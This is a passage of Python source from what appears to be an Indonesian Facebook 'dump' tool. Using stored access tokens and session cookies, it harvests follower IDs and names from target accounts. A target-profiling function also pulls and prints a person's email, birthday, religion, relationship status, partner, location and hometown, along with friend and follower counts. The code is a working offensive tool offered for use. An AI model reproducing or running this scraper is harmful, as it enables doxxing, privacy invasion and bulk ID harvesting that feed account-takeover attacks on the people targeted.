			except (KeyError,IOError):
				lok = "-"
			coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			el = json.loads(coa.text)
			try:lk = el["name"]
			except (KeyError,IOError):
				lk = "-"
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			ciner = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uik,token),cookies=coki).json()
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(uik,token),cookies=coki)
			eil = json.loads(cyna.text)
			try:
				for fuck in eil['subscribers']['data']:
					to.append(fuck['id']+'|'+fuck['name'])
			except KeyError:
				pass
			kuntol+=1
			print(f"\r{P} [{H}{str(kuntol)}{P}] {uik}|{len(to)}")
			to.clear()
		except KeyError:
			print(K+'*--> '+M+'akun terspam')
	print("")
	x=f"{P2}salin hasil nya cokk biar gk ulang dump lagi!!"
	vprint(panel(x,style=f"{H3}"))
	input(f"{garis} enter untuk kembali")
	menu()


def check_ingfo_akun():
	idt=[]
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
	except (KeyError,IOError):
		jalan(garis+" cookie kadaluarsa");cek_cookie()
	idt = input(garis+" id target :%s "%(H))
	try:
		zx = requests.get("https://graph.facebook.com/"+idt+"?access_token=%s"%(token),cookies=coki);zy = json.loads(zx.text)
	except (KeyError,IOError):jalan(garis+" id tidak ditemukan");menu()
	try:nm = zy["name"]
	except (KeyError,IOError):nm = (M+"-")
	try:nd = zy["first_name"]
	except (KeyError,IOError):nd = (M+"-")
	try:nt = zy["middle_name"]
	except (KeyError,IOError):nt = (M+"-")
	try:nb = zy["last_name"]
	except (KeyError,IOError):nb = (M+"-")
	try:ut = zy["birthday"]
	except (KeyError,IOError):ut = (M+"-")
	try:gd = zy["gender"]
	except (KeyError,IOError):gd = (M+"-")
	try:em = zy["email"]
	except (KeyError,IOError):em = (M+"-")
	try:lk = zy["link"]
	except (KeyError,IOError):lk = (M+"-")
	try:us = zy["username"]
	except (KeyError,IOError):us = (M+"-")
	try:rg = zy["religion"]
	except (KeyError,IOError):rg = (M+"-")
	try:rl = zy["relationship_status"]
	except (KeyError,IOError):rl = (M+"-")
	try:rls = zy["significant_other"]["name"]
	except (KeyError,IOError):rls = (M+"-")
	try:lc = zy["location"]["name"]
	except (KeyError,IOError):lc = (M+"-")
	try:ht = zy["hometown"]["name"]
	except (KeyError,IOError):ht = (M+"-")
	try:ab = zy["about"]
	except (KeyError,IOError):ab = (M+"-")
	try:lo = zy["locale"]
	except (KeyError,IOError):lo = (M+"-")
	#try:ppk = zy["education"]["id"]
	#except (KeyError,IOError):ppk = (M+"-")
	print("")
	jalan(garis+" nama : %s%s"%(H,nm))
	jalan(garis+" nama depan : %s%s"%(H,nd))
	jalan(garis+" nama tengah : %s%s"%(H,nt))
	jalan(garis+" nama belakang : %s%s"%(H,nb))
	jalan(garis+" TTL : %s%s"%(H,ut))
	jalan(garis+" gender : %s%s"%(H,gd))
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cy = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(idt,token),cookies=coki)
		z = json.loads(cy.text)
		for i in z['friends']['data']:
			id.append(i['id'])
	except:pass
	jalan(garis+" total friends : "+H+"%s"%str(len(id)));time.sleep(0.03)
	lao=[]
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(idt,token),cookies=coki)
		eil = json.loads(cyna.text)
		for fuck in eil['subscribers']['data']:
			lao.append(fuck['id'])
	except:pass
	jalan(garis+" total followers : "+H+"%s"%(len(lao)));time.sleep(0.03)
	jalan(garis+" email : %s%s"%(H,em))
	jalan(garis+" link : %s%s"%(H,lk))
	jalan(garis+" username : %s%s"%(H,us))
	jalan(garis+" agama : %s%s"%(H,rg))
	jalan(garis+" status hubungan : %s%s"%(H,rl))
	jalan(garis+" hubungan dengan : %s%s"%(H,rls))
	jalan(garis+" tempat tinggal : %s%s"%(H,lc))
	jalan(garis+" tempat asal : %s%s"%(H,ht))
	jalan(garis+" tentang : %s%s"%(H,ab))
	jalan(garis+" locale : %s%s"%(H,lo))
	input(garis+" enter untuk kembali");menu()



#up_dat_()
ex_run()
